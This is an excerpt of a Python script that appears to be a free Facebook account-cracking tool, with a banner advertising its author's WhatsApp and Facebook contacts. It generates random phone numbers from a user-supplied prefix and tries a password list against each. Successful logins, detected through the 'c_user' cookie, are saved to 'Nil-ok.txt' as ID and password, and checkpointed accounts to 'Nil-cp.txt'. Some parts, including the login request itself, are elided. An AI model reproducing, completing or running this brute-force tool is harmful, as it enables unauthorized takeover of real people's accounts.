...
\x1b[1;97m------------------------\x1b[1;97m------------------------
\n\x1b[1;92m   ADMIN : \x1b[1;97Nil jan  \x1b[1;95mTOOL:\x1b[1;97mFREE     \x1b[1;91mV:\x1b[1;97m1.2.0

         \x1b[1;92m  WHATSAPP: \x1b[1;95m+8801914436101
          \x1b[1;92m FACEBOOK:  \x1b[1;95mNx Nil Choudhury 
\033[1;37m------------------------\033[1;37m------------------------ """ 
loop = 0
oks = []
cps = []
...
def random_number():
    ...
    os.system('clear')
    print(logo)
    print('\033[1;33mCode example: 017,019,018,016 ...\033[0;97m')
    kode = input('Put code: ')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;32m[Nil-Xan-OK] '+cid+' | '+ps+'\033[0;97m')
                open('Nil-ok.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;31m[Nil-Xan-CP] '+cid+' | '+ps+'\033[0;97m')
                open('Nil-cp.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
